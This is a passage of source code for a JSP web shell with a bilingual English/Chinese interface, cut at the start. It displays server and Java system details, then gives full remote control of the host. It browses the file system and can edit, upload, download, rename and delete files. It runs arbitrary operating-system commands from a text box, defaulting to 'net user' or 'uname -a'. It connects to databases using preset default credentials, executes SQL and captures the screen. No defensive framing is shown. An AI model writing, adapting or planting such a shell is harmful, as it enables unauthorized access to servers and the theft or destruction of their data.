            <td><%=System.getProperty("java.class.path")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Java Library Path") %></td>
            <td><%=System.getProperty("java.library.path")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Java tmpdir") %></td>
            <td><%=System.getProperty("java.io.tmpdir")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Compiler") %></td>
            <td><%=System.getProperty("java.compiler") == null ? "" : System.getProperty("java.compiler")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Java ext dirs") %></td>
            <td><%=System.getProperty("java.ext.dirs")%></td>
        </tr>
        <tr>
            <td><%=orChinese("Remote Addr") %></td>
            <td><%=request.getRemoteAddr()%></td>
        </tr>
        <tr>
            <td><%=orChinese("Remote Host") %></td>
            <td><%=request.getRemoteHost()%></td>
        </tr>
        <tr>
            <td><%=orChinese("Remote User") %></td>
            <td><%=request.getRemoteUser() == null ? "" : request.getRemoteUser()%></td>
        </tr>
        <tr>
            <td><%=orChinese("Scheme") %></td>
            <td><%=request.getScheme()%></td>
        </tr>
        <tr>
            <td><%=orChinese("Secure") %></td>
            <td><%=request.isSecure() == true ? orChinese("Yes") : orChinese("No") %></td>
        </tr>
    </table>
    <%
        }
        if (action.equals("file")) {
            String curPath = "";
            String result = "";
            String fsAction = "";
            if (request.getParameter("curPath") == null) {
                curPath = request.getSession().getServletContext().getRealPath(request.getServletPath());
                curPath = pathConvert((new File(curPath)).getParent());
            }
            else {
                curPath = Unicode2GB((String)request.getParameter("curPath"));
                curPath = pathConvert(curPath);
            }
            if (request.getParameter("fsAction") == null) {
                fsAction = "list";
            } else {
                fsAction = (String)request.getParameter("fsAction");
            }
            if (fsAction.equals("list")){
            %>
    <div class="container">
        <form method="post" name="form3" action="<%= request.getRequestURI() + "?action=file"%>">
            <div align="left">

                <input type="text" class="trans" size="100" name="curPath" value="<%=curPath%>" /> <input type="submit" value="<%=orChinese("GOTO") %>"
                    class="trans" /> <input type="button" value="<%=orChinese("Home") %>" class="trans"
                    onclick="javascript:document.getElementById('file_system').click();" />
                <% 
                String os = System.getProperties().getProperty("os.name");
                if (os.toUpperCase().contains("WIN")){
                    File[] files = File.listRoots();
                    for(int i = 0; i < files.length; i++) {
                           %>
                <input type="button" class="trans"
                    onclick="javascript:window.location.href='<%= request.getRequestURI() + "?action=file&curPath=" + files[i].getPath().replace("\\", "/")%>'"
                    value="<%= files[i]%>" />
                <%
                    }
                }
                %>

            </div>
            <table class="onhover" style="width: 100%">
                <tr>
                    <td align="center"><%=orChinese("File Name") %></td>
                    <td align="center" width="10%"><%=orChinese("Size") %></td>
                    <td align="center" width="38%"><%=orChinese("Operation") %></td>
                </tr>
                <tr>
                    <%
                    File curFolder = new File(curPath);
                %>
                    <td><a href="<%=request.getRequestURI() %>?action=file&curPath=<%=curFolder.getParent() %>">[..]</a></td>
                    <td align="right"></td>
                    <td></td>
                </tr>
                <% 
                for (File file : this.getFolderList(curPath)){
                    MyFile f = new MyFile(file.getAbsolutePath(),request.getRequestURI()+"?action=file&curPath=" +curPath );
                    f.setHtmlOperation(Operation.Rename,Operation.Delete,Operation.Download);
                    %>
                <tr>
                    <td><a href="<%=request.getRequestURI() %>?action=file&curPath=<%=f.getAbsolutePath() %>">[<%=f.getName() %>]
                    </a></td>
                    <td align="right"><%=f.getLength() %></td>
                    <td><%=f.getHtmlOperation() %></td>
                </tr>
                <%
                }
                for (File file : this.getFileList(curPath)){
                    MyFile f = new MyFile(file.getAbsolutePath(),request.getRequestURI()+"?action=file&curPath=" +curPath );
                    f.setHtmlOperation(Operation.Edit,Operation.Rename,Operation.Delete,Operation.Download);
                    %>
                <tr>
                    <td><%=f.getName() %></td>
                    <td align="right"><%=f.getLength() %></td>
                    <td><%=f.getHtmlOperation() %></td>
                </tr>
                <%
                }
                %>
            </table>
            <div align="left">
                <table style="width: 100%;">
                    <tr>
                        <td align="left" style="border: 0">
                            <input type="text" name="uploadFilePath" id="uploadFilePath" size="60" class="trans" /> 
                            <input type="button" value="<%=orChinese("Select")%>" class="trans" onclick="javascript:document.getElementById('fileSelect').click()"> 
                            <input type="button" value="<%=orChinese("Upload")%>" class="trans" onclick="javascript:document.getElementById('uploadform').submit()" />
                        </td>
                        <td align="right" style="border: 0">
                            <input type="text" id="createFileName" class="trans" size="26" name="fileName" /> 
                            <input type="button" class="trans" value="<%=orChinese("Create File")%>" onclick='createFile("<%=request.getRequestURI() + "?action=file&curPath=" + curPath + "&fsAction=createFile"%>")'>
                            <input type="button" class="trans" value="<%=orChinese("Create Folder")%>" onclick='createFile("<%=request.getRequestURI() + "?action=file&curPath=" + curPath + "&fsAction=createFolder"%>")'>
                        </td>
                    </tr>
                </table>
            </div>
        </form>
        <div align="left">
            <form id="uploadform" name="upload" enctype="multipart/form-data" method="post"
                action="<%=request.getRequestURI() + "?action=file&curPath=" + curPath + "&fsAction=upload"%>">
                <input type="file" style="display: none" name="upFile" id="fileSelect"
                    onchange="javascript:document.getElementById('uploadFilePath').value=this.value" />
            </form>
        </div>
    </div>

    <%
            }else if (fsAction.equals("Edit")){
                if (request.getParameter("fileName") == null) {
                    result = "<div class=\"container\"><font color=\"red\">"+orChinese("Folder name is null")+"</font></div>";
                } else {
                    String fileName = Unicode2GB(request.getParameter("fileName").trim());
                    result = openFile(curPath, fileName, request.getRequestURI() + "?action=" + action);
                }
            }else if (fsAction.equals("save")) {
                 if (request.getParameter("fileContent") == null) {
                    result = "<font color=\"red\">"+orChinese("Content is null")+"</font>";
                } else {
                    if (request.getParameter("fileName") == null) {
                        result = "<div class=\"container\"><font color=\"red\">"+orChinese("Folder name is null")+"</font></div>";
                    } else {
                        String fileName = Unicode2GB(request.getParameter("fileName").trim());
                        String fileContent = Unicode2GB((String)request.getParameter("fileContent"));
                        result = saveFile(curPath, fileName, request.getRequestURI() + "?action=" + action, fileContent);
                    }
                }
            } else if (fsAction.equals("createFolder")) {
                if (request.getParameter("fileName") == null) {
                    result = "<div class=\"container\"><font color=\"red\">"+orChinese("Folder name is null")+"</font></div>";
                } else {
                    String folderName = Unicode2GB(request.getParameter("fileName").trim());
                    if (folderName.equals("")) {
                        result = "<div class=\"container\"><font color=\"red\">"+orChinese("Folder name is null")+"</font></div>";
                    } else {
                        result = createFolder(curPath,folderName,request.getRequestURI() + "?action=" + action);
                    }
                } 
            } else if (fsAction.equals("createFile")) {
                 if (request.getParameter("fileName") == null) {
                    result = "<div class=\"container\"><font color=\"red\">"+orChinese("File name is null")+"</font></div>";
                } else {
                    String fileName = Unicode2GB(request.getParameter("fileName").trim());
                    if (fileName.equals("")) {
                        result = "<div class=\"container\"><font color=\"red\">"+orChinese("File name is null")+"</font></div>";
                    } else {
                        result = createFile(curPath,fileName,request.getRequestURI() + "?action=" + action);
                    }
                }
            } else if (fsAction.equals("Delete")) {
                String fileName= Unicode2GB(request.getParameter("fileName").trim());
                result = deleteFile(curPath,fileName,request.getRequestURI() + "?action=" + action);
            } else if (fsAction.equals("upload")) {
                result = uploadFile(request, curPath, request.getRequestURI() + "?action=" + action);
            } else if (fsAction.equals("Rename")) {
                String newName = Unicode2GB(request.getParameter("newName").trim());
                String fileName = Unicode2GB(request.getParameter("fileName").trim());
                result = rename(curPath,fileName,newName,request.getRequestURI() + "?action=" + action);
            } else if (fsAction.equals("Download")) {
                String fileName= Unicode2GB(request.getParameter("fileName").trim());
                result = download(curPath,fileName,request.getRequestURI() + "?action=" + action, response);
            }
            %>
    <div class="container">
        <font color="red"><%=result %></font>
    </div>
    <%
        }
        if (action.equals("search")) {
            String curPath = request.getSession().getServletContext().getRealPath(request.getServletPath());
            curPath = pathConvert((new File(curPath)).getParent());
            
            String searchpath = Unicode2GB(request.getParameter("searchpath"));
            if (searchpath == null || searchpath.trim().length() == 0){
                searchpath = curPath;
            }
            String searchsubfix = Unicode2GB(request.getParameter("searchsubfix"));
            if (searchsubfix == null || searchsubfix.trim().length() == 0){
                searchsubfix = ".jsp .html .htm";
            }
            String searchby = request.getParameter("searchby");
            String ignorecase = request.getParameter("ignorecase");
            String searchcontent = Unicode2GB(request.getParameter("searchcontent"));
            if (searchcontent == null || searchcontent.trim().length() == 0){
                searchcontent = "index";
            }
            String fsAction = request.getParameter("fsAction");
            String searchResult = "";
            if (fsAction != null){
                searchResult = searchFile(searchpath, searchcontent , searchsubfix, "name".equals(searchby),"yes".equals(ignorecase));
            }
    %>
    <form class="container" name="searchForm" method="post" action="<%=request.getRequestURI() + "?action=search&fsAction=search"%>">
        <table>
            <tr>
                <td width="260px" align="right"><%=orChinese("Search from") %>:</td>
                <td><input type="text" id="searchpath" class="trans" name="searchpath" size="100" value="<%=searchpath %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Search for file type") %>:</td>
                <td><input type="text" id="searchsubfix" class="trans" name="searchsubfix" size="100" value="<%=searchsubfix %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Setting") %>:</td>
                <td>
                    <%
                    if ("content".equals(searchby)){
                        %> <input type="radio" class="trans" name="searchby" value="name" /><%=orChinese("Search by Name") %> <input type="radio" name="searchby"
                    class="trans" value="content" checked="checked" /><%=orChinese("Search by Content") %> <%
                    }else{
                        %> <input type="radio" class="trans" name="searchby" value="name" checked="checked" /><%=orChinese("Search by Name") %> <input type="radio"
                    name="searchby" class="trans" value="content" /><%=orChinese("Search by Content") %> <%
                    }
                    if ("yes".equals(ignorecase)){
                        %> <input type="checkbox" name="ignorecase" class="trans" value="yes" checked="checked" /><%=orChinese("Ignore Case") %> <%
                    }else{
                        %> <input type="checkbox" name="ignorecase" class="trans" value="yes" /><%=orChinese("Ignore Case") %> <%
                    }
                    %>
                </td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Search keyword") %>:</td>
                <td><input type="text" id="searchcontent" class="trans" name="searchcontent" size="40" value="<%=searchcontent %>" /> <input type="submit"
                    value="<%=orChinese("Search") %>" class="trans" /></td>
            </tr>
            <tr>
                <td colspan="2" align="left" id="searchresult"><%=searchResult %></td>
            </tr>
        </table>
    </form>
    <%
        }
        if (action.equals("command")) {
            String cmd = "";
            InputStream ins = null;
            String result = "";
            
            if (request.getParameter("command") != null) {        
                cmd = (String)request.getParameter("command");
                result = exeCmd(cmd);
            }
    %>
    <form class="container" name="form2" method="post" action="<%=request.getRequestURI() + "?action=command"%>">
        <%
        if (cmd==null || "".equals(cmd.trim())){
            if (System.getProperty("os.name").toLowerCase().contains("windows")){
                cmd = "cmd.exe /c net user";
            }else{
                cmd = "uname -a";
            }
        }
    %>
        <div align="left">
            <input type="text" size="130" class="trans" size="133" name="command" value="<%=cmd%>" /> <input type="submit" class="trans"
                value="<%=orChinese("Execute") %>" />
        </div>
        <table style="width: 100%; height: 100px">
            <tr>
                <td><%=result == "" ? "&nbsp;" : result%></td>
            </tr>
        </table>
    </form>
    <% 
        } 
        if (action.equals("database")) { 
            String SQLResult = "";
            String dbType = request.getParameter("dbType");
            dbType = dbType == null?"Mysql":dbType;
            String driver = request.getParameter("driver");
            String port = request.getParameter("port");
            String dbname = Unicode2GB(request.getParameter("dbname"));
            String host = Unicode2GB(request.getParameter("host"));
            String sql = Unicode2GB(request.getParameter("sql"));
            String dbuser = Unicode2GB(request.getParameter("dbuser"));
            String dbpass = Unicode2GB(request.getParameter("dbpass"));
            String fsAction = request.getParameter("fsAction");
            String connurl = Unicode2GB(request.getParameter("connurl"));
            if (sql==null) sql="";
            if (fsAction == null || "typeChange".equals(fsAction)){
                if ("Mysql".equalsIgnoreCase(dbType)){
                    driver = "com.mysql.jdbc.Driver";
                    port = "3306";
                    dbuser = "root";
                    dbpass = "root";
                    host = "localhost";
                    dbname = "mysql";
                }else if("Oracle".equalsIgnoreCase(dbType)){
                    driver = "oracle.jdbc.driver.OracleDriver";
                    port = "1521";
                    dbuser = "scott";
                    dbpass = "tiger";
                    host = "localhost";
                    dbname = "orcl";
                }else if("SQLServer".equalsIgnoreCase(dbType)){
                    driver = "com.microsoft.jdbc.sqlserver.SQLServerDriver";
                    port = "1433";
                    dbuser = "sa";
                    dbpass = "123456";
                    host = "localhost";
                    dbname = "master";
                }else if("DB2".equalsIgnoreCase(dbType)){
                    driver = "com.ibm.db2.jdbc.app.DB2Driver";
                    port = "5000";
                    dbuser = "db2admin";
                    dbpass = "123456";
                    host = "localhost";
                    dbname = "";
                }else if("Other".equalsIgnoreCase(dbType)){
                    driver = "sun.jdbc.odbc.JdbcOdbcDriver";
                    connurl = "jdbc:odbc:dsn=dsnName;User=username;Password=password";
                    dbuser = "";
                    dbpass = "";
                }
            }else if("connect".equals(fsAction)){
                if (driver!=null){
                    Class.forName(driver);
                    if ("Mysql".equalsIgnoreCase(dbType)){
                        connurl = "jdbc:mysql://localhost:"+port+"/" + dbname;
                    }else if("Oracle".equalsIgnoreCase(dbType)){
                        connurl = "jdbc:oracle:thin@localhost:"+port+":"+ dbname;
                    }else if("SQLServer".equalsIgnoreCase(dbType)){
                        connurl = "jdbc:sqlserver://localhost:"+port+";databaseName=" + dbname;
                    }else if("DB2".equalsIgnoreCase(dbType)){
                        connurl = "jdbc:db2://localhost:"+port+"/" + dbname;
                    }
                    SQLResult = this.DBConnect(connurl, dbuser, dbpass);
                }
            }else if("disconnect".equals(fsAction)){
                try {
                    if (dbStatement != null) {
                        dbStatement.close();
                        dbStatement = null;
                    }
                    if (conn != null) {
                        conn.close();
                        conn = null;
                    }
                } catch (SQLException e) {
                
                }
            }else if("execute".equals(fsAction)){
                SQLResult = DBExecute(sql);
            }
    %>
    <form class="container" id="sqlform" name="sqlform" method="post" action="<%=request.getRequestURI() + "?action=database"%>">
        <table style="width: 100%;">
            <tr>
                <td align="right" width="15%"><%=orChinese("Database Type") %>:</td>
                <td align="left" width="85%"><select id="dbtype_select" name=dbType style="background-color: black; color: white"
                    onchange="dbsubmit('typeChange')">
                        <%
                        if ("Mysql".equalsIgnoreCase(dbType)){
                            %>
                        <option value="Mysql" selected="selected">Mysql</option>
                        <option value="Oracle">Oracle</option>
                        <option value="SQLServer">SQLServer</option>
                        <option value="DB2">DB2</option>
                        <option value="Other">Other</option>
                        <%
                        }else if("Oracle".equalsIgnoreCase(dbType)){
                            %>
                        <option value="Mysql">Mysql</option>
                        <option value="Oracle" selected="selected">Oracle</option>
                        <option value="SQLServer">SQLServer</option>
                        <option value="DB2">DB2</option>
                        <option value="Other">Other</option>
                        <%
                        }else if("DB2".equalsIgnoreCase(dbType)){
                            %>
                        <option value="Mysql">Mysql</option>
                        <option value="Oracle">Oracle</option>
                        <option value="SQLServer">SQLServer</option>
                        <option value="DB2" selected="selected">DB2</option>
                        <option value="Other">Other</option>
                        <%
                        }else if("SQLServer".equalsIgnoreCase(dbType)){
                            %>
                        <option value="Mysql">Mysql</option>
                        <option value="Oracle">Oracle</option>
                        <option value="SQLServer" selected="selected">SQLServer</option>
                        <option value="DB2">DB2</option>
                        <option value="Other">Other</option>
                        <%
                        }else if("Other".equalsIgnoreCase(dbType)){
                            %>
                        <option value="Mysql">Mysql</option>
                        <option value="Oracle">Oracle</option>
                        <option value="SQLServer">SQLServer</option>
                        <option value="DB2">DB2</option>
                        <option value="Other" selected="selected">Other</option>
                        <%
                        }
                        %>
                </select></td>
            </tr>

            <tr>
                <td align="right"><%=orChinese("Driver") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="driver" value="<%=driver %>" /></td>
            </tr>
            <%
            if ("Other".equalsIgnoreCase(dbType)){
                %>
            <tr>
                <td align="right"><%=orChinese("Connect URL") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="connurl" value="<%=connurl %>" /></td>
            </tr>
            <%
            }else{
                %>
            <tr>
                <td align="right"><%=orChinese("Host") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="host" value="<%=host %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Port") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="port" value="<%=port %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("DB Name") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="dbname" value="<%=dbname %>" /></td>
            </tr>
            <%
            }
            %>
            <tr>
                <td align="right"><%=orChinese("Username") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="dbuser" value="<%=dbuser %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Password") %>:</td>
                <td align="left"><input type="text" size="50" class="trans" name="dbpass" value="<%=dbpass %>" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("Connect") %>:</td>
                <td align="left"><input type="button" class="trans" value="<%=orChinese("Connect") %>" onclick="dbsubmit('connect')" /> <input type="button"
                    class="trans" value="<%=orChinese("Disconnect") %>" onclick="dbsubmit('disconnect')" /></td>
            </tr>
            <tr>
                <td align="right"><%=orChinese("SQL") %>:</td>
                <td><input type="text" class="trans" size="100" name="sql" value="<%=sql %>" /> <input type="submit" class="trans"
                    value="<%=orChinese("Execute") %>" onclick="dbsubmit('execute')" /></td>
            </tr>
            <tr height="50">
                <td colspan="2"><%=SQLResult %></td>
            <tr />
        </table>
    </form>
    <%}
    if (action.equals("screen")){
        %>
        <div class="container" align="left">
            <input type="button" value="<%=orChinese("Refresh") %>" class="trans" onclick="javascript:location = location" /> 
            <img style="-webkit-user-select: none; cursor: zoom-in;" width="100%" src="<%=request.getRequestURI()+"?action=getscreen" %>" />
        </div>
        <%
    }
    if (action.equals("getscreen")){
        out.clear();  
        out = pageContext.pushBody();
        this.getScreenImg(request, response);
    }
    %>
    <%}%>
    <a href="#" onclick="languageChanged('<%=request.getRequestURI()+"?action=lang&lang=ENG" %>',window.location.href)">English</a>&nbsp;
    <a href="#" onclick="languageChanged('<%=request.getRequestURI()+"?action=lang&lang=CHN" %>',window.location.href)">&#20013;&#25991;</a>
</body>
</html>